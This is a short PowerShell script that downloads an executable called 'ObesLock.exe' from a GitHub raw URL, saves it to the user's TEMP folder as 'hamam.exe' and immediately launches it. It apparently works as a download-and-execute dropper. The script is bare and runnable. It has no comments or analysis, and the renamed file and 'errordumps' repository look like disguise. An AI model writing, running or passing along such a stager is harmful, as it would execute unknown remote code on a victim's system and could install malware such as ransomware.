$url = "https://raw.githubusercontent.com/fasa3e/errordumps/refs/heads/main/ObesLock.exe"
$output = "$env:TEMP\hamam.exe"
Invoke-WebRequest -Uri $url -OutFile $output
Start-Process $output
